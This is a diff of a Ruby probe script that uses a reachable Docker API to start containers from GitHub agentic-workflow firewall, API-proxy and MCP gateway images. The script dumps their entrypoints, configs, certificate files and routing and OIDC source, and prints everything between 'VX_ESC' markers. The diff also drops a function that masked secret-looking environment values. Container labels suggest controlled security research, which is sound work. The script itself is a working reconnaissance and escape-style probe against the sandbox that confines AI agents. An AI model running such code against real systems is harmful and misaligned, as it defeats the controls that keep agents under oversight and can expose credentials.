@@ -32,17 +32,6 @@ rescue => e
   [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
 end
 
-SECRETY = /token|secret|key|password|cert|cred|auth|cookie|bearer|jwt/i
-
-def mask_env(kv)
-  k, _, v = kv.partition('=')
-  if k =~ SECRETY
-    "#{k}=#{v[0, 10]}...[len=#{v.length}]"
-  else
-    kv[0, 160]
-  end
-end
-
 def decode_docker_logs(body)
   output = +''
   while body.bytesize >= 8 && [1, 2].include?(body.getbyte(0)) && body.byteslice(1, 3) == "\0\0\0"
@@ -54,131 +43,55 @@ def decode_docker_logs(body)
   output.empty? ? body : output
 end
 
-def create_container(opts)
-  st, pl = dapi('POST', '/containers/create', opts)
-  return nil unless st == 201 || st == 200
-  JSON.parse(pl)['Id']
-rescue
-  nil
-end
-
-def rm_container(cid)
-  dapi('DELETE', "/containers/#{cid}?force=1&v=1") if cid
-end
-
-# run a shell probe inside a created container; returns decoded log text or nil
 def sh_probe(image, cmd)
-  cid = create_container(
-    'Image' => image,
-    'Entrypoint' => ['/bin/sh', '-c'],
-    'Cmd' => [cmd],
-    'Tty' => false,
-    'HostConfig' => { 'NetworkMode' => 'none' },
-    'Labels' => { 'vulnoryx.controlled' => 'pages-imgcfg-c4c8' }
-  )
-  return nil unless cid
+  st, pl = dapi('POST', '/containers/create',
+    'Image' => image, 'Entrypoint' => ['/bin/sh', '-c'], 'Cmd' => [cmd],
+    'Tty' => false, 'HostConfig' => { 'NetworkMode' => 'none' },
+    'Labels' => { 'vulnoryx.controlled' => 'pages-imgfiles-c4c8' })
+  return "VX_CREATE_FAIL #{st} #{pl[0, 120]}" unless st == 201
+  cid = JSON.parse(pl)['Id']
   begin
-    st, pl = dapi('POST', "/containers/#{cid}/start")
-    return "VX_START_FAIL #{st} #{pl[0, 150]}" unless st == 204 || st == 304
-    wst, wpl = dapi('POST', "/containers/#{cid}/wait?condition=not-running")
-    ec = (JSON.parse(wpl)['StatusCode'] rescue '?')
-    lst, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
-    "VX_EXIT=#{ec}\n" + decode_docker_logs(lpl)
+    st2, pl2 = dapi('POST', "/containers/#{cid}/start")
+    return "VX_START_FAIL #{st2} #{pl2[0, 120]}" unless st2 == 204 || st2 == 304
+    dapi('POST', "/containers/#{cid}/wait?condition=not-running")
+    _, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
+    decode_docker_logs(lpl)
   ensure
-    rm_container(cid)
+    dapi('DELETE', "/containers/#{cid}?force=1&v=1")
   end
 end
 
-# export container fs as tar; list entries, extract small interesting files
-def export_probe(image, max_bytes = 64 * 1024 * 1024)
-  cid = create_container('Image' => image, 'Tty' => false,
-                         'Labels' => { 'vulnoryx.controlled' => 'pages-imgcfg-c4c8' })
-  return "VX_EXPORT_CREATE_FAIL" unless cid
-  begin
-    st, tar = dapi('GET', "/containers/#{cid}/export")
-    return "VX_EXPORT_FAIL #{st} #{tar[0, 120]}" unless st == 200
-    return "VX_EXPORT_TRUNCATED size=#{tar.bytesize}" if tar.bytesize > max_bytes
-    names = []
-    files = {}
-    i = 0
-    while i + 512 <= tar.bytesize
-      blk = tar.byteslice(i, 512)
-      break if blk.bytes.all?(&:zero?)
-      name = blk.byteslice(0, 100).to_s.split("\0").first.to_s
-      size = blk.byteslice(124, 12).to_s.strip.to_i(8)
-      type = blk.byteslice(156, 1)
-      i += 512
-      if type != '5' && !name.empty?
-        names << name
-        interesting = name =~ %r{(^|/)etc/} ||
-                      name =~ /(entrypoint|start|run|boot|init)[^\/]*\.(sh|bash)?$/i ||
-                      name =~ /\.(conf|pem|key|crt|ya?ml|json|toml|cfg|ini|env)$/i
-        files[name] = tar.byteslice(i, size)[0, 800] if interesting && size > 0 && size < 65_536
-      end
-      i += ((size + 511) / 512) * 512
-    end
-    res = +"VX_TAR_ENTRIES=#{names.size}\n"
-    res << "VX_TAR_TOP #{names.select { |n| n.count('/') <= 2 }.first(80).join(' | ')}\n"
-    files.first(20).each { |n, c| res << "VX_FS_FILE #{n} (#{c.bytesize}B):\n#{c}\n---\n" }
-    res
-  ensure
-    rm_container(cid)
-  end
+def cat_cmd(files)
+  parts = files.map { |f, n| "echo 'VX_F:#{f}'; head -c #{n} '#{f}' 2>/dev/null || echo MISS; echo" }
+  (parts + ["echo VX_DONE"]).join('; ')
 end
 
-IMAGES = {
-  'fw_agent'   => 'ghcr.io/github/gh-aw-firewall/agent:latest',
-  'fw_apiproxy'=> 'ghcr.io/github/gh-aw-firewall/api-proxy:latest',
-  'fw_squid'   => 'ghcr.io/github/gh-aw-firewall/squid:latest',
-  'mcpg'       => 'ghcr.io/github/gh-aw-mcpg:latest',
-  'mcp_server' => 'ghcr.io/github/github-mcp-server:latest',
-  'dep_core'   => 'ghcr.io/dependabot/dependabot-updater-core:latest'
-}
+# 1) squid: entrypoint + locate any squid.conf
+OUT << "VX_SQUID\n" + sh_probe('ghcr.io/github/gh-aw-firewall/squid:latest',
+  "echo 'VX_F:/usr/local/bin/entrypoint.sh'; head -c 1600 /usr/local/bin/entrypoint.sh; echo; " \
+  "echo VX_FINDCONF; find / -name 'squid*.conf' -o -name '*.pem' -o -name '*.crt' 2>/dev/null | head -30; " \
+  "for c in /etc/squid/squid.conf /usr/local/squid/etc/squid.conf; do [ -f $c ] && echo \"VX_F:$c\" && head -c 1400 $c; done; echo VX_DONE")[0, 3400]
 
-st, pl = dapi('GET', '/images/json')
-if st == 200
-  tags = JSON.parse(pl).flat_map { |im| im['RepoTags'] || [] }.uniq
-  OUT << "VX_IMGCACHE #{tags.size} tags: #{tags.first(45).join(' | ')}"
-  tags.select { |t| t =~ /gh-aw|mcp|dependabot|squid|proxy/i && !IMAGES.value?(t) }
-      .each { |t| IMAGES["x_#{t.split('/').last.tr(':', '_')}"] = t }
-else
-  OUT << "VX_IMGCACHE_ERR #{st} #{pl[0, 200]}"
-end
+# 2) fw agent + mcpg entrypoints
+OUT << "VX_AGENT\n" + sh_probe('ghcr.io/github/gh-aw-firewall/agent:latest',
+  cat_cmd([['/usr/local/bin/entrypoint.sh', 1600]]))[0, 2000]
 
-IMAGES.each do |short, name|
-  st, pl = dapi('GET', "/images/#{name}/json")
-  if st != 200
-    OUT << "VX_IMGCFG_#{short} MISS #{st} #{pl[0, 100]}"
-    next
-  end
-  cfg = (JSON.parse(pl)['Config'] rescue {}) || {}
-  env = (cfg['Env'] || []).map { |kv| mask_env(kv) }
-  OUT << "VX_IMGCFG_#{short} user=#{cfg['User'].inspect} wd=#{cfg['WorkingDir'].inspect} " \
-         "entry=#{cfg['Entrypoint'].inspect} cmd=#{cfg['Cmd'].inspect} ports=#{cfg['ExposedPorts'].inspect}"
-  OUT << "VX_IMGCFG_#{short}_env #{env.empty? ? '(none)' : env.join(' | ')}"
-  lbl = cfg['Labels']
-  OUT << "VX_IMGCFG_#{short}_lbl #{lbl.inspect[0, 250]}" if lbl && !lbl.empty?
-end
+OUT << "VX_MCPG\n" + sh_probe('ghcr.io/github/gh-aw-mcpg:latest',
+  cat_cmd([['/app/run_containerized.sh', 1200], ['/app/package.json', 500]]))[0, 2000]
 
-PROBE_CMD = 'echo VX_LS; ls / /etc /app /opt /srv /usr/local/bin /bin 2>/dev/null | head -200; ' \
-            'echo VX_CONF; for f in /etc/squid/* /etc/*.conf /etc/*/*.conf /etc/*/*.yaml /etc/*/*.yml ' \
-            '/etc/*/*.json /etc/*/*.pem /etc/*/*.crt /app/*.json /app/*.yaml /app/*.toml ' \
-            '/docker-entrypoint* /entrypoint* /usr/local/bin/*entry* /run.sh /start.sh; do ' \
-            'if [ -f "$f" ]; then s=$(wc -c < "$f" 2>/dev/null); echo "VX_FILE:$f(${s}B)"; ' \
-            'head -c 900 "$f" 2>/dev/null; echo; fi; done; echo VX_DONE'
+# 3) api-proxy: config JSONs + wiring (endpoints/provider names)
+OUT << "VX_APIPROXY\n" + sh_probe('ghcr.io/github/gh-aw-firewall/api-proxy:latest',
+  cat_cmd([
+    ['/usr/local/bin/docker-entrypoint.sh', 700],
+    ['/app/package.json', 900],
+    ['/app/provider-env-constants.json', 1400],
+    ['/app/model-api-mapping.json', 1400],
+    ['/app/routing-config.js', 1000],
+    ['/app/server.js', 1200],
+    ['/app/github-oidc.js', 800]
+  ]) + "; echo VX_DIRS; ls /app/guards /app/providers /app/transforms 2>/dev/null")[0, 4400]
 
-{ 'fw_squid'    => 'ghcr.io/github/gh-aw-firewall/squid:latest',
-  'fw_apiproxy' => 'ghcr.io/github/gh-aw-firewall/api-proxy:latest' }.each do |short, name|
-  r = sh_probe(name, PROBE_CMD)
-  if r.nil? || !r.include?('VX_DONE')
-    OUT << "VX_FS_#{short} sh_probe_failed(#{r.nil? ? 'create' : r[0, 120].inspect}) -> export"
-    OUT << export_probe(name)
-  else
-    OUT << "VX_FS_#{short}\n#{r[0, 3200]}"
-  end
-end
-
-payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 9000]
+payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 9200]
 puts 'VX_ESC_BEGIN'
 puts payload
 puts 'VX_ESC_END'
